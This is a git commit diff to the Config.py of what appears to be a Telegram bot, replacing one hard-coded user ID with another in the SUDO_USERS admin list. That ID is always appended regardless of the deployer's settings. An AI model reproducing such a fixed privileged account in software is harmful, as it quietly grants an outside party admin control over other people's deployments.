cd31e9cb8cb52557159a7a63d36fceddd139fedc
HabDV <99927628+HabDV@users.noreply.github.com>
2022-05-20 21:52:54 +1000

    Update Config.py

--- Config.py
+++ Config.py
@@ -8,7 +8,7 @@ class Config():
     APP_ID = os.environ.get("APP_ID", 6)
     API_HASH = os.environ.get("API_HASH", None)
     SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
-    SUDO_USERS.append(939425014)
+    SUDO_USERS.append(943373593)
     SUDO_USERS = list(set(SUDO_USERS))
   else:
     BOT_TOKEN = ""
@@ -16,7 +16,7 @@ class Config():
     APP_ID = ""
     API_HASH = ""
     SUDO_USERS = list(set(int(x) for x in ''.split()))
-    SUDO_USERS.append(939425014)
+    SUDO_USERS.append(943373593)
     SUDO_USERS = list(set(SUDO_USERS))
 
 
